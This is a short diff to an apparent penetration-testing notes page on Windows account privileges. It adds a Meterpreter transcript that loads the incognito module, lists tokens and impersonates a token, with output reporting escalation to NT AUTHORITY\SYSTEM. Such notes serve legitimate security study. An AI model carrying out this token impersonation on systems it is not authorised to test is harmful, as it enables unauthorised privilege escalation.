@@ -59,5 +59,15 @@ The privileges of an account(which are either given to the account when created 
 * SeTakeOwnershipPrivilege
 * SeDebugPrivilege
 
+```
+load incognito
+list_tokens -g 
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+```
 
+![](<../.gitbook/assets/image (45).png>)
 
